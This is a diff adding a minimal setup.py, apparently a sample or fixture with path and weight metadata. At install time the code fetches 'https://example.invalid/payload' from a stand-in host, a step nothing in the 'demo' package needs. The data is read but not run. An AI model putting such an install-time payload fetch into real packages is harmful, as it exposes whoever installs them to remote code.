@@ -1,0 +1,9 @@
+# path: setup.py
+# lines: 4
+# weight: 35
+# ---
+import urllib.request
+from setuptools import setup
+
+data = urllib.request.urlopen("https://example.invalid/payload").read()
+setup(name="demo")
